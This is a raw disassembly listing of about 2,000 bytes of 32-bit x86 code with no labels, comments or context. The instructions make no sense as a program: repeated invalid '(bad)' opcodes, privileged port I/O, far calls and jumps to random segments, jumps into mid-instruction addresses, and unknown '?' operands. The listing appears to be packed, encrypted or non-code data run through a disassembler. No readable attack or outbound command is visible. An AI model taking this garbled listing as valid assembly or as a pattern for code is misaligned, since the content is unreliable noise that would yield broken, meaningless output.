  40b6e3:	dec    esi
  40b6e4:	pushf  
  40b6e5:	dec    ebx
  40b6e6:	je     0x40b722
  40b6e8:	daa    
  40b6e9:	mov    edi,0xc49130e2
  40b6ee:	clc    
  40b6ef:	pop    esp
  40b6f0:	stos   DWORD PTR es:[edi],eax
  40b6f1:	cmp    eax,0x5e443b4a
  40b6f6:	push   cs
  40b6f7:	cmc    
  40b6f8:	gs in  eax,dx
  40b6fa:	test   BYTE PTR [esi+edi*4+0x56f61bf3],ch
  40b701:	or     eax,0x3b06c00
  40b706:	fsubr  st(0),st
  40b708:	mov    esp,eax
  40b70a:	popa   
  40b70b:	push   ebp
  40b70c:	pop    esp
  40b70d:	dec    ebx
  40b70e:	jbe    0x40b6e6
  40b710:	fwait
  40b711:	icebp  
  40b712:	mov    ebx,0x96f2bf09
  40b717:	add    BYTE PTR [edi-0x74d82817],dh
  40b71d:	cs mov edi,0xd5ff5431
  40b723:	dec    ecx
  40b724:	pop    edx
  40b725:	push   ebp
  40b726:	add    bh,ch
  40b728:	add    eax,0xf18e1455
  40b72d:	sbb    ch,BYTE PTR [esi]
  40b72f:	popa   
  40b730:	adc    esp,DWORD PTR [ecx-0x3a]
  40b733:	dec    ebx
  40b734:	inc    esi
  40b735:	pusha  
  40b736:	popa   
  40b737:	mov    al,ds:0x22390a2a
  40b73c:	mov    BYTE PTR [esi-0x100c466c],cl
  40b742:	cmc    
  40b743:	popf   
  40b744:	sbb    BYTE PTR [edx+eax*8+0x5b7916ac],ch
  40b74b:	pusha  
  40b74c:	jl     0x40b731
  40b74e:	mov    WORD PTR ds:0xe6a2faa6,?
  40b754:	cmp    bl,0xf4
  40b757:	xchg   edi,eax
  40b758:	ja     0x40b70f
  40b75a:	fld    DWORD PTR [eax+edx*8+0x48f6bc45]
  40b761:	rcr    DWORD PTR [esi-0x17606037],cl
  40b767:	add    eax,0xbb441916
  40b76c:	xchg   ecx,eax
  40b76d:	xor    al,al
  40b76f:	mov    ?,edx
  40b771:	and    esp,DWORD PTR [edx-0x3e8d001c]
  40b777:	push   ecx
  40b778:	loopne 0x40b752
  40b77a:	into   
  40b77b:	dec    edi
  40b77c:	mov    eax,ds:0xd1de2bb0
  40b781:	xor    dh,ch
  40b783:	lea    esp,[eax+0x31]
  40b786:	mov    ebp,0x43525ff4
  40b78b:	xor    ecx,ecx
  40b78d:	aaa    
  40b78e:	clc    
  40b78f:	and    cl,BYTE PTR [esi]
  40b791:	pop    es
  40b792:	mov    fs,WORD PTR [esi+0x19]
  40b795:	mov    dh,0x7a
  40b797:	aad    0x4a
  40b799:	in     al,0x62
  40b79b:	pop    es
  40b79c:	out    0x7b,al
  40b79e:	fcomp  QWORD PTR [ebx]
  40b7a0:	int    0xda
  40b7a2:	push   es
  40b7a3:	int3   
  40b7a4:	xchg   ah,bl
  40b7a6:	out    dx,eax
  40b7a7:	cld    
  40b7a8:	dec    esi
  40b7a9:	(bad)  
  40b7aa:	cmc    
  40b7ab:	aas    
  40b7ac:	inc    edx
  40b7ad:	cli    
  40b7ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7af:	ret    0xd68
  40b7b2:	dec    edx
  40b7b3:	and    al,0x67
  40b7b5:	popa   
  40b7b6:	sub    BYTE PTR [ecx],dl
  40b7b8:	xchg   eax,eax
  40b7ba:	aad    0xdb
  40b7bc:	call   0x4ed8:0x94eac3e1
  40b7c3:	xchg   edi,eax
  40b7c4:	dec    edi
  40b7c5:	xlat   BYTE PTR ds:[ebx]
  40b7c6:	mov    edx,0x9c25c188
  40b7cb:	jmp    0x40b774
  40b7cd:	inc    ebp
  40b7ce:	data16 in al,0x27
  40b7d1:	jmp    0x40b7c6
  40b7d3:	dec    edx
  40b7d4:	mov    esi,DWORD PTR [edi+0x79]
  40b7d7:	add    al,0x9d
  40b7d9:	mov    ebp,0x99b10679
  40b7de:	sub    edx,DWORD PTR [eax-0x362ca4ee]
  40b7e4:	jecxz  0x40b7ee
  40b7e6:	sbb    esp,DWORD PTR [eax+0x54a5d22a]
  40b7ec:	imul   DWORD PTR ds:0xc52a898
  40b7f2:	inc    edx
  40b7f3:	xor    edx,0xac64d59a
  40b7f9:	xchg   BYTE PTR [ecx-0xb2b335f],cl
  40b7ff:	(bad)  
  40b800:	add    eax,0x7d755e4c
  40b805:	inc    eax
  40b806:	xchg   BYTE PTR [ecx],bh
  40b808:	and    BYTE PTR fs:[edi],bl
  40b80b:	enter  0xe2a3,0xa5
  40b80f:	out    0xd6,eax
  40b811:	pop    es
  40b812:	es cdq 
  40b814:	jecxz  0x40b86e
  40b816:	jbe    0x40b7dd
  40b818:	cli    
  40b819:	sub    DWORD PTR [ebp+0x77df56f6],esi
  40b81f:	jecxz  0x40b801
  40b821:	add    DWORD PTR [ebx+0xc],esp
  40b824:	fistp  DWORD PTR [esi+0x16d77c63]
  40b82a:	ror    esp,1
  40b82c:	mov    dl,0x46
  40b82e:	int3   
  40b82f:	stos   BYTE PTR es:[edi],al
  40b830:	inc    ebp
  40b831:	push   esi
  40b832:	jne    0x40b88d
  40b834:	sbb    BYTE PTR [esi-0x4ba918c1],0x2d
  40b83b:	xchg   BYTE PTR [edx-0xf],ch
  40b83e:	out    dx,eax
  40b83f:	ss js  0x40b820
  40b842:	not    BYTE PTR [edx-0x1cc1f638]
  40b848:	and    al,0x17
  40b84a:	xor    esp,DWORD PTR [eax+0x4c339760]
  40b850:	pop    esi
  40b851:	add    BYTE PTR [ecx-0x51e01b13],cl
  40b857:	inc    ebx
  40b858:	test   BYTE PTR [esi+0x59],0x4e
  40b85c:	mov    esi,0xf743530b
  40b861:	scas   al,BYTE PTR es:[edi]
  40b862:	fnsave [edi+0x5]
  40b865:	gs mov dl,ah
  40b868:	call   0xb212:0xd575e17b
  40b86f:	xlat   BYTE PTR ds:[ebx]
  40b870:	pop    esi
  40b871:	test   DWORD PTR [esi-0xe],ebx
  40b874:	jmp    0x8d3b:0xc69474e6
  40b87b:	and    esi,DWORD PTR [ebx-0x7e]
  40b87e:	fmul   QWORD PTR [ebx]
  40b880:	jne    0x40b8e6
  40b882:	cwde   
  40b883:	hlt    
  40b884:	add    DWORD PTR [edx],eax
  40b886:	in     al,dx
  40b887:	mov    ch,0xa3
  40b889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b88a:	in     eax,0x99
  40b88c:	xor    eax,0x5492b753
  40b891:	add    DWORD PTR fs:[ebp+0x35b3b9fa],ebp
  40b898:	pop    ds
  40b899:	fnsave [ecx]
  40b89b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b89c:	scas   eax,DWORD PTR es:[edi]
  40b89d:	cs mov bl,0xaf
  40b8a0:	mov    edx,0xc95c0c5e
  40b8a5:	jp     0x40b8c2
  40b8a7:	test   DWORD PTR [ebx+0xc],esi
  40b8aa:	push   edi
  40b8ab:	and    esi,DWORD PTR [eax-0x5b]
  40b8ae:	repnz xor edi,esi
  40b8b1:	rcr    BYTE PTR [edx],0xdf
  40b8b4:	xor    edx,ebp
  40b8b6:	xchg   edx,eax
  40b8b7:	out    dx,al
  40b8b8:	popa   
  40b8b9:	push   ebx
  40b8ba:	call   0x8369:0xe76739bb
  40b8c1:	repnz push esp
  40b8c3:	mov    bh,0x6f
  40b8c5:	mov    bh,0xac
  40b8c7:	mov    eax,ds:0xf0a950ac
  40b8cc:	sti    
  40b8cd:	(bad)  
  40b8ce:	arpl   WORD PTR [eax-0x6f04a2a8],di
  40b8d4:	test   al,0x6e
  40b8d6:	push   edx
  40b8d7:	add    DWORD PTR [ebx+0x5b],ebx
  40b8da:	fwait
  40b8db:	dec    ebx
  40b8dc:	pop    edx
  40b8dd:	sub    BYTE PTR ds:0xf3b3f4db,al
  40b8e3:	add    eax,0xdb4d30dc
  40b8e8:	add    bl,BYTE PTR [esi-0x19]
  40b8eb:	je     0x40b932
  40b8ed:	stc    
  40b8ee:	popa   
  40b8ef:	sub    DWORD PTR [ebx-0x4edf592],esp
  40b8f5:	mov    esp,0x57117a68
  40b8fa:	jge    0x40b8fe
  40b8fc:	add    ebx,esp
  40b8fe:	push   ds
  40b8ff:	and    eax,0x8bfebebe
  40b904:	shr    BYTE PTR [eax+ecx*8-0xa0979c],0x7c
  40b90c:	les    esi,FWORD PTR [ebx-0x39d128cb]
  40b912:	jle    0x40b931
  40b914:	in     al,dx
  40b915:	test   BYTE PTR [edx],bh
  40b917:	retf   0xd6f5
  40b91a:	mov    esi,0xebc9502c
  40b91f:	mov    ebx,0x6f05c17b
  40b924:	mov    dh,0xf6
  40b926:	add    edx,DWORD PTR [eax-0x76f09521]
  40b92c:	sub    al,0xf8
  40b92e:	test   bl,dl
  40b930:	pop    ebp
  40b931:	inc    ebx
  40b932:	fimul  WORD PTR [edx+ecx*1]
  40b935:	sbb    al,0x1c
  40b937:	jle    0x40b977
  40b939:	(bad)  
  40b93a:	std    
  40b93b:	pop    ss
  40b93c:	mov    es:0x68758cae,al
  40b942:	adc    esp,DWORD PTR [ebx-0x7f446578]
  40b948:	hlt    
  40b949:	mov    bl,0xe3
  40b94b:	shr    BYTE PTR [edx+0x9],0x3d
  40b94f:	dec    ebx
  40b950:	dec    esi
  40b951:	sbb    DWORD PTR [eax+0x17acd631],esp
  40b957:	jbe    0x40b9aa
  40b959:	cmp    BYTE PTR ds:0x9afacd39,dh
  40b95f:	mov    ah,bh
  40b961:	aad    0x12
  40b963:	dec    eax
  40b964:	jg     0x40b929
  40b966:	add    DWORD PTR [edi],ecx
  40b968:	jne    0x40b948
  40b96a:	cs lods eax,DWORD PTR ds:[esi]
  40b96d:	(bad)  
  40b96e:	fisttp DWORD PTR [esi]
  40b970:	(bad)  
  40b971:	icebp  
  40b972:	pop    esi
  40b973:	cs hlt 
  40b975:	clc    
  40b976:	pop    ds
  40b977:	repnz mov ah,BYTE PTR ds:[esi+0x1]
  40b97c:	push   edx
  40b97d:	pop    esi
  40b97e:	or     DWORD PTR [ecx+0x100ca16d],edi
  40b984:	mov    ebp,0x9ec07898
  40b989:	(bad)  
  40b98a:	stos   DWORD PTR es:[edi],eax
  40b98b:	repz bnd jae 0x40ba01
  40b98f:	popa   
  40b990:	mov    ebp,0x5c972a25
  40b995:	dec    edx
  40b996:	inc    edi
  40b997:	jo     0x40b9ff
  40b999:	(bad)  
  40b99a:	mov    ah,0xb
  40b99c:	in     eax,dx
  40b99d:	mov    bl,0xf7
  40b99f:	jmp    0x40b991
  40b9a1:	cmp    al,0x53
  40b9a3:	mov    ds:0xb7366abd,eax
  40b9a8:	aam    0x3d
  40b9aa:	aad    0x65
  40b9ac:	xor    ebp,0x848ba2c7
  40b9b2:	aam    0x7d
  40b9b4:	and    dl,BYTE PTR [eax-0x74]
  40b9b7:	mov    ecx,0xfb2e495e
  40b9bc:	xor    eax,0x426d66f9
  40b9c1:	or     edi,DWORD PTR [eax+eiz*2]
  40b9c4:	ja     0x40b9c2
  40b9c6:	xlat   BYTE PTR ds:[ebx]
  40b9c7:	pushf  
  40b9c8:	jae    0x40b9ca
  40b9ca:	push   ebx
  40b9cb:	xor    eax,0xd54ba28e
  40b9d0:	aaa    
  40b9d1:	clc    
  40b9d2:	pop    esi
  40b9d3:	sbb    BYTE PTR [edi],ah
  40b9d5:	aas    
  40b9d6:	and    ebp,DWORD PTR [esp+eiz*8]
  40b9d9:	(bad)  
  40b9da:	out    0x28,eax
  40b9dc:	pop    edi
  40b9dd:	jl     0x40b966
  40b9df:	pop    ss
  40b9e0:	shr    edi,0xe5
  40b9e3:	ins    BYTE PTR es:[edi],dx
  40b9e4:	xor    bl,BYTE PTR [ecx-0x57435f25]
  40b9ea:	add    edi,DWORD PTR [ebp+ebp*2+0x218c7cb1]
  40b9f1:	or     edx,ecx
  40b9f3:	fcomp  QWORD PTR [esi+0xc]
  40b9f6:	loope  0x40b994
  40b9f8:	popf   
  40b9f9:	push   ss
  40b9fa:	pop    esp
  40b9fb:	mov    ecx,0xc28f1bc7
  40ba00:	sti    
  40ba01:	fcomp  QWORD PTR [ebx+0x7c]
  40ba04:	cdq    
  40ba05:	inc    edi
  40ba06:	popf   
  40ba07:	sbb    ch,BYTE PTR [edx-0x538fd864]
  40ba0d:	aam    0xe0
  40ba0f:	in     eax,dx
  40ba10:	retf   
  40ba11:	gs xchg edx,eax
  40ba13:	sahf   
  40ba14:	gs pop ebx
  40ba16:	loope  0x40b9af
  40ba18:	jmp    0xf5ef53ac
  40ba1d:	fdivp  st(3),st
  40ba1f:	push   ss
  40ba20:	ja     0x40ba30
  40ba22:	js     0x40ba84
  40ba24:	imul   eax,DWORD PTR [eax+0x1e],0xffffffd1
  40ba28:	repz jl 0x40ba59
  40ba2b:	xchg   esp,eax
  40ba2c:	cmp    eax,0x1ebd2c26
  40ba31:	outs   dx,BYTE PTR ds:[esi]
  40ba32:	jns    0x40ba1e
  40ba34:	push   eax
  40ba35:	fwait
  40ba36:	popf   
  40ba37:	mov    WORD PTR [ebx],es
  40ba39:	clc    
  40ba3a:	out    0x99,al
  40ba3c:	in     eax,0x4f
  40ba3e:	outs   dx,DWORD PTR ds:[esi]
  40ba3f:	retf   
  40ba40:	test   eax,0x5d59e53e
  40ba45:	pop    esp
  40ba46:	(bad)  
  40ba47:	push   esp
  40ba48:	in     al,dx
  40ba49:	xor    BYTE PTR [edx],bh
  40ba4b:	cmp    bl,BYTE PTR [esi]
  40ba4d:	pandn  mm5,QWORD PTR [ebp+edx*4+0x14fe1693]
  40ba55:	fist   WORD PTR [ecx+0x36]
  40ba58:	(bad)  
  40ba59:	sbb    esp,ecx
  40ba5b:	pop    ss
  40ba5c:	shl    DWORD PTR [esi-0x64],0xc7
  40ba60:	outs   dx,DWORD PTR ds:[esi]
  40ba61:	inc    esp
  40ba62:	xlat   BYTE PTR ds:[ebx]
  40ba63:	(bad)  
  40ba65:	out    0xe8,al
  40ba67:	call   FWORD PTR [esi+0x3c]
  40ba6a:	push   0x44
  40ba6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba6d:	std    
  40ba6e:	shl    DWORD PTR [ecx],0x9d
  40ba71:	cmp    edi,ebx
  40ba73:	sti    
  40ba74:	leave  
  40ba75:	pop    ebp
  40ba76:	jl     0x40ba96
  40ba78:	jp     0x40ba88
  40ba7a:	jo     0x40baae
  40ba7c:	or     al,0x87
  40ba7e:	lods   eax,DWORD PTR ds:[esi]
  40ba7f:	sub    BYTE PTR [ecx-0x18],dh
  40ba82:	push   ebp
  40ba83:	xor    al,0x1a
  40ba85:	sub    bl,BYTE PTR ds:0x86465007
  40ba8b:	push   esp
  40ba8c:	fsub   QWORD PTR [ecx+0x6f839a92]
  40ba92:	pop    eax
  40ba93:	dec    ebx
  40ba94:	cmp    al,0xfb
  40ba96:	test   eax,ebx
  40ba98:	cmp    eax,0x832dcf1c
  40ba9d:	mov    ch,BYTE PTR [edi-0xc]
  40baa0:	ret    
  40baa1:	retf   0xe167
  40baa4:	jnp    0x40babe
  40baa6:	rcl    BYTE PTR [ecx-0x78],cl
  40baa9:	rcl    DWORD PTR [ebp-0xc],1
  40baac:	mov    cl,0x1a
  40baae:	cwde   
  40baaf:	inc    esp
  40bab0:	push   0x4
  40bab2:	inc    eax
  40bab3:	push   eax
  40bab4:	fdivr  DWORD PTR [edx]
  40bab6:	repnz xchg ecx,eax
  40bab8:	mov    cl,0x8b
  40baba:	mov    ds:0x2dfaf245,eax
  40babf:	jns    0x40ba95
  40bac1:	adc    eax,0xd2cded11
  40bac6:	xchg   ecx,eax
  40bac7:	cli    
  40bac8:	cli    
  40bac9:	(bad)  
  40baca:	stos   DWORD PTR es:[edi],eax
  40bacb:	push   ss
  40bacc:	rcr    BYTE PTR [ebx+0xc],cl
  40bacf:	cmp    eax,0xf5f4c1c9
  40bad4:	add    eax,0x5970f7f3
  40bad9:	sahf   
  40bada:	and    DWORD PTR ds:[esi+eax*4],0xffffff8f
  40badf:	(bad)  
  40bae0:	pop    esi
  40bae1:	mov    al,ds:0xa58866a5
  40bae6:	cmp    dl,BYTE PTR [ecx+0x2f053839]
  40baec:	xor    bh,BYTE PTR [edi-0x17]
  40baef:	and    dl,BYTE PTR [esi-0x239632e0]
  40baf5:	add    BYTE PTR [edi+ebx*8],0xfe
  40baf9:	in     al,0x9d
  40bafb:	test   al,0x1c
  40bafd:	out    0x15,al
  40baff:	mov    edx,0xa34d7c3d
  40bb04:	sub    al,0xeb
  40bb06:	xchg   esi,eax
  40bb07:	sub    BYTE PTR [ebp-0x24],ch
  40bb0a:	ins    BYTE PTR es:[edi],dx
  40bb0b:	push   es
  40bb0c:	dec    ebp
  40bb0d:	(bad)  
  40bb0f:	loop   0x40bafd
  40bb11:	sbb    edx,DWORD PTR [ebx+0x17]
  40bb14:	sbb    cl,BYTE PTR [eax+eax*4]
  40bb17:	add    DWORD PTR [esp+ebx*1-0x6212ca9a],ebx
  40bb1e:	cli    
  40bb1f:	outs   dx,BYTE PTR ds:[esi]
  40bb20:	jge    0x40bb3c
  40bb22:	push   edi
  40bb23:	xor    ch,BYTE PTR [ecx-0x6c]
  40bb26:	mov    dh,ah
  40bb28:	pop    ss
  40bb29:	sti    
  40bb2a:	pop    ss
  40bb2b:	iret   
  40bb2c:	jno    0x40baef
  40bb2e:	sub    eax,0x1b23cfc6
  40bb33:	cmp    BYTE PTR [ebx+0x3e],cl
  40bb36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb37:	push   0x179da4f7
  40bb3c:	cmc    
  40bb3d:	xor    BYTE PTR [edi+0x1d],dl
  40bb40:	jne    0x40bb2d
  40bb42:	data16 in al,dx
  40bb44:	cmp    DWORD PTR [edx+0x621b8a78],esp
  40bb4a:	xchg   ebx,eax
  40bb4b:	gs xadd dh,dh
  40bb4f:	mov    eax,ds:0xd2f28810
  40bb54:	pop    ecx
  40bb55:	stos   DWORD PTR es:[edi],eax
  40bb56:	call   0xda4b:0x9884f0c4
  40bb5d:	cwde   
  40bb5e:	inc    eax
  40bb5f:	out    0x9,eax
  40bb61:	stc    
  40bb62:	out    dx,eax
  40bb63:	pop    esi
  40bb64:	rcr    esi,1
  40bb66:	mov    esi,0x31654f9d
  40bb6b:	in     al,dx
  40bb6c:	jp     0x40bb80
  40bb6e:	sub    eax,ecx
  40bb70:	inc    ecx
  40bb71:	fimul  DWORD PTR [esi]
  40bb73:	sahf   
  40bb74:	sbb    ebx,DWORD PTR [ecx-0x44]
  40bb77:	call   0xa79939fe
  40bb7c:	jne    0x40bbb5
  40bb7e:	imul   esi,DWORD PTR [eax+0x18],0xffffff94
  40bb82:	xor    edx,ebx
  40bb84:	shl    BYTE PTR [ebx+eiz*1],0xec
  40bb88:	mov    DWORD PTR [edx-0x7b782320],ebp
  40bb8e:	dec    esi
  40bb8f:	imul   edi,DWORD PTR [ecx+0x6a],0xffffffad
  40bb93:	mov    WORD PTR [ebx-0x316a3c33],gs
  40bb99:	fwait
  40bb9a:	mov    ah,dl
  40bb9c:	das    
  40bb9d:	mov    fs,WORD PTR [esi+0x2bbf624]
  40bba3:	call   0xc2b:0x32e56125
  40bbaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbab:	and    al,0xe
  40bbad:	data16 add al,0x95
  40bbb0:	jmp    0x810242b6
  40bbb5:	punpckhbw mm1,QWORD PTR ds:0x518300e
  40bbbc:	mov    ebx,0x44de3e1b
  40bbc1:	test   eax,0xee0714a2
  40bbc6:	jl     0x40bbbd
  40bbc8:	jne    0x40bbfd
  40bbca:	inc    esi
  40bbcb:	dec    esp
  40bbcc:	sub    al,0xad
  40bbce:	cmp    eax,eax
  40bbd0:	pop    ebp
  40bbd1:	or     DWORD PTR [esi+0x7401ea3e],ecx
  40bbd7:	fisttp DWORD PTR [ecx+0x60]
  40bbda:	test   eax,0x999fc149
  40bbdf:	dec    ecx
  40bbe0:	adc    eax,0x6dffc822
  40bbe5:	adc    esp,ebp
  40bbe7:	rol    esp,1
  40bbe9:	and    esi,DWORD PTR [edx+0x79a5861d]
  40bbef:	mov    ch,cl
  40bbf1:	adc    esp,ebp
  40bbf3:	push   0x8400ab7e
  40bbf8:	loopne 0x40bbc4
  40bbfa:	stos   BYTE PTR es:[edi],al
  40bbfb:	clc    
  40bbfc:	out    0x5d,al
  40bbfe:	popa   
  40bbff:	mov    ds:0x77bbf35a,eax
  40bc04:	cmp    DWORD PTR [ebp-0x3b],esi
  40bc07:	sub    eax,0xc1b9e176
  40bc0c:	fcom   QWORD PTR [eax-0x65b04a73]
  40bc12:	xchg   ebp,eax
  40bc13:	sbb    BYTE PTR [eax+0x58],cl
  40bc16:	pop    ebx
  40bc17:	outs   dx,DWORD PTR ds:[esi]
  40bc18:	ror    ebp,0x57
  40bc1b:	aaa    
  40bc1c:	and    BYTE PTR [edx],ch
  40bc1e:	xchg   edx,eax
  40bc1f:	dec    esi
  40bc20:	push   ebx
  40bc21:	sub    dl,BYTE PTR [ecx+0x78758629]
  40bc27:	jmp    0x198167fc
  40bc2c:	inc    eax
  40bc2d:	enter  0xf1b7,0xef
  40bc31:	sbb    eax,0x22cde45d
  40bc36:	iret   
  40bc37:	mov    al,0xfc
  40bc39:	sub    dl,0xaa
  40bc3c:	imul   ebp,DWORD PTR [ecx-0x5b],0x22cddb4c
  40bc43:	or     bl,BYTE PTR [ebx-0x46]
  40bc46:	mov    al,0xe5
  40bc48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc49:	push   edx
  40bc4a:	xor    BYTE PTR ds:0x8b91ee4e,dh
  40bc50:	add    BYTE PTR [ecx+0x33],0x9b
  40bc54:	pop    ss
  40bc55:	pushf  
  40bc56:	mov    ds:0x3f808a74,eax
  40bc5b:	jge    0x40bc54
  40bc5d:	cmp    dh,BYTE PTR [ecx-0x76867939]
  40bc63:	add    eax,0x1a135ee1
  40bc68:	mov    DWORD PTR [edx-0x56],edx
  40bc6b:	sub    BYTE PTR ds:0x4c009d61,bl
  40bc71:	xor    ah,BYTE PTR [esi-0x3b]
  40bc74:	loope  0x40bc5b
  40bc76:	and    bh,ah
  40bc78:	leave  
  40bc79:	dec    ebp
  40bc7a:	push   ecx
  40bc7b:	mov    dh,0x24
  40bc7d:	xchg   edi,eax
  40bc7e:	ret    
  40bc7f:	push   cs
  40bc80:	repz add BYTE PTR [ebp+0x77],ah
  40bc84:	mov    ds:0x5d913202,eax
  40bc89:	mul    BYTE PTR [esi]
  40bc8b:	mov    ?,WORD PTR [ecx+0x4a]
  40bc8e:	idiv   BYTE PTR [ecx-0x13]
  40bc91:	xchg   ebx,eax
  40bc92:	xchg   ebp,eax
  40bc93:	push   0xffffffae
  40bc95:	gs mov al,0xef
  40bc98:	ret    0xe24e
  40bc9b:	sbb    DWORD PTR [ebx+0x43],0xc923ba26
  40bca2:	jecxz  0x40bd17
  40bca4:	repnz lods eax,DWORD PTR ds:[esi]
  40bca6:	xor    al,0x65
  40bca8:	pop    eax
  40bca9:	xchg   edx,eax
  40bcaa:	cli    
  40bcab:	pop    ecx
  40bcac:	aam    0x34
  40bcae:	fidivr DWORD PTR [ebx]
  40bcb0:	clc    
  40bcb1:	adc    ebx,DWORD PTR [edi*4-0x29a631a5]
  40bcb8:	pop    esi
  40bcb9:	int3   
  40bcba:	pop    es
  40bcbb:	enter  0xf2b2,0x9d
  40bcbf:	sub    eax,0x4cf00429
  40bcc4:	adc    esp,edi
  40bcc6:	fdivr  st,st(4)
  40bcc8:	sbb    eax,0x230b3ab4
  40bccd:	and    ch,dh
  40bccf:	out    dx,eax
  40bcd0:	sbb    al,0x6c
  40bcd2:	retf   0x64aa
  40bcd5:	jb     0x40bcc2
  40bcd7:	loope  0x40bd4a
  40bcd9:	dec    ebp
  40bcda:	or     ebp,esi
  40bcdc:	mov    ch,0x82
  40bcde:	fidiv  DWORD PTR [ecx]
  40bce0:	and    al,0xc3
  40bce2:	mov    bl,0x1e
  40bce4:	sub    ebp,edx
  40bce6:	adc    ecx,ecx
  40bce8:	pop    ebx
  40bce9:	mov    eax,0xbf942e85
  40bcee:	xchg   esp,eax
  40bcef:	inc    ecx
  40bcf0:	arpl   WORD PTR [edi-0x6e57834f],dx
  40bcf6:	cmp    ch,al
  40bcf8:	cmp    BYTE PTR [edi-0x118d90b7],dh
  40bcfe:	push   esi
  40bcff:	fwait
  40bd00:	pop    ecx
  40bd01:	imul   edx,edx,0x58
  40bd04:	outs   dx,BYTE PTR ds:[esi]
  40bd05:	scas   eax,DWORD PTR es:[edi]
  40bd06:	data16 hlt 
  40bd08:	dec    esi
  40bd09:	cmp    BYTE PTR [ecx+0x52],cl
  40bd0c:	xor    BYTE PTR [ebp+0x4664e7d3],0xea
  40bd13:	sbb    ebx,DWORD PTR [ecx]
  40bd15:	push   ss
  40bd16:	xor    ebx,DWORD PTR [ebx]
  40bd18:	(bad)  [ebx-0x226864ae]
  40bd1e:	inc    ecx
  40bd1f:	push   eax
  40bd20:	fs out 0x98,al
  40bd23:	pusha  
  40bd24:	jge    0x40bcde
  40bd26:	test   al,0xec
  40bd28:	pop    edi
  40bd29:	jmp    0x33ea0a9c
  40bd2e:	and    esp,0x68600659
  40bd34:	sbb    bl,BYTE PTR ds:0x71f9d087
  40bd3a:	dec    edx
  40bd3b:	ficom  WORD PTR [edx]
  40bd3d:	pop    ds
  40bd3e:	xchg   dh,bl
  40bd40:	sub    ch,BYTE PTR [ebx]
  40bd42:	add    DWORD PTR [ebp-0x29],esp
  40bd45:	test   eax,0xb776b87e
  40bd4a:	loopne 0x40bcdd
  40bd4c:	(bad)  
  40bd4d:	mov    bl,0x49
  40bd4f:	or     al,0xdc
  40bd51:	push   es
  40bd52:	in     eax,0x8b
  40bd54:	inc    esi
  40bd55:	jns    0x40bd0c
  40bd57:	cld    
  40bd58:	jns    0x40bd9e
  40bd5a:	or     ebp,DWORD PTR [eax-0x670efa3a]
  40bd60:	inc    edi
  40bd61:	ficom  WORD PTR [edi]
  40bd63:	sbb    al,dh
  40bd65:	push   es
  40bd66:	retf   0x110c
  40bd69:	cli    
  40bd6a:	xor    al,cl
  40bd6c:	clc    
  40bd6d:	adc    BYTE PTR [ebx-0xf3a192a],0x50
  40bd74:	add    ebx,esp
  40bd76:	dec    ebx
  40bd77:	dec    esi
  40bd78:	jle    0x40bdbf
  40bd7a:	or     esp,DWORD PTR [eax]
  40bd7c:	add    eax,0x8d778a9d
  40bd81:	xor    al,0x9c
  40bd83:	in     al,dx
  40bd84:	sar    BYTE PTR [edi-0x6],1
  40bd87:	pop    eax
  40bd88:	lods   eax,DWORD PTR ds:[esi]
  40bd89:	aas    
  40bd8a:	test   al,0x76
  40bd8c:	lods   eax,DWORD PTR ds:[esi]
  40bd8d:	xchg   ecx,eax
  40bd8e:	mov    al,0x96
  40bd90:	jmp    0xf3c29fc0
  40bd95:	add    BYTE PTR [esi+0x48],bl
  40bd98:	inc    esi
  40bd99:	stc    
  40bd9a:	lahf   
  40bd9b:	test   eax,0x1e333a94
  40bda0:	adc    eax,0x73448c8c
  40bda5:	fistp  WORD PTR gs:[eax+ecx*2]
  40bda9:	loopne 0x40bdc7
  40bdab:	jmp    0x40bda8
  40bdad:	fwait
  40bdae:	push   0xfffffffe
  40bdb0:	sub    DWORD PTR [ecx+ebp*4+0x54],eax
  40bdb4:	pop    ds
  40bdb5:	push   es
  40bdb6:	int3   
  40bdb7:	inc    eax
  40bdb8:	push   ebx
  40bdb9:	inc    eax
  40bdba:	imul   esp,esi,0xfffffff7
  40bdbd:	jge    0x40bd93
  40bdbf:	xchg   esi,eax
  40bdc0:	stos   BYTE PTR es:[edi],al
  40bdc1:	pop    ebx
  40bdc2:	(bad)  
  40bdc4:	nop
  40bdc5:	(bad)
  40bdc8:	push   cs
  40bdc9:	push   0xef0e7774
  40bdce:	and    al,0xfc
  40bdd0:	jbe    0x40bdbf
  40bdd2:	and    BYTE PTR [ebp+0x26a36e44],bl
  40bdd8:	out    0xf,al
  40bdda:	pop    es
  40bddb:	(bad)  
  40bddc:	aaa    
  40bddd:	scas   eax,DWORD PTR es:[edi]
  40bdde:	retf   0xd5a4
  40bde1:	pop    esp
  40bde2:	lods   al,BYTE PTR ds:[esi]
  40bde3:	push   esi
  40bde4:	and    al,bl
  40bde6:	xchg   edi,eax
  40bde7:	pop    eax
  40bde8:	int    0xc2
  40bdea:	mov    bh,0x20
  40bdec:	adc    al,0x90
  40bdee:	lods   al,BYTE PTR ds:[esi]
  40bdef:	rcr    BYTE PTR [ebp+eax*8+0x16c176b5],1
  40bdf6:	rcr    edx,cl
  40bdf8:	cmp    edx,DWORD PTR [ecx]
  40bdfa:	rcl    esp,1
  40bdfc:	fild   DWORD PTR [ebx-0x2d026ec1]
  40be02:	push   ss
  40be03:	xchg   edx,eax
  40be04:	ret    
  40be05:	pusha  
  40be06:	(bad)  [ebx]
  40be08:	(bad)  
  40be09:	push   esi
  40be0a:	loope  0x40be0c
  40be0c:	push   esi
  40be0d:	jb     0x40be43
  40be0f:	cmp    dl,BYTE PTR [eax-0x2e]
  40be12:	push   ds
  40be13:	lods   eax,DWORD PTR ds:[esi]
  40be14:	faddp  st(0),st
  40be16:	fwait
  40be17:	retf   
  40be18:	jg     0x40bdaa
  40be1a:	stos   DWORD PTR es:[edi],eax
  40be1b:	(bad)  
  40be1c:	or     bl,cl
  40be1e:	clc    
  40be1f:	fnstsw WORD PTR [eax+0x73]
  40be22:	cmp    esp,DWORD PTR [eax-0x7]
  40be25:	es icebp 
  40be27:	mov    dh,BYTE PTR [ecx]
  40be29:	cmp    BYTE PTR ds:0xf73b,bh
  40be2e:	and    BYTE PTR [edx],cl
  40be30:	jge    0x40beaa
  40be32:	popa   
  40be33:	jmp    0x40be91
